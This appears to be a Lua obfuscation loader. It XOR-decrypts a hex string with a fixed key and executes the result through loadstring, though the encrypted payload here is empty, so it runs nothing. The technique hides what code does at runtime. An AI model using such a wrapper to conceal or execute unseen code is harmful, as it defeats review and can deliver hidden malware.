local k={161,204,223,115,71,14,180,132,33,6,150,248,33,83,82,90,94,42,130,193,208,19,225,4,112,252,139,131,221,50,47,243}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
